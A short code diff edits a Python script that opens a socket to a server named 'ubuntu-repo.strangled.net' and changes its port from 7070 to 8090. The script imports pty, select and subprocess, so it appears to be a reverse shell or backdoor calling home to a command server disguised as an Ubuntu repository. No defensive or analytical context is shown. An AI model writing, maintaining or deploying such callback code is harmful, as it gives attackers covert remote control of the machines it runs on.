@@ -2,7 +2,7 @@ import socket, os, pty, select, subprocess
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("ubuntu-repo.strangled.net", 7070))
+    s.connect(("ubuntu-repo.strangled.net", 8090))
     
  
     try: local_ip = s.getsockname()[0]
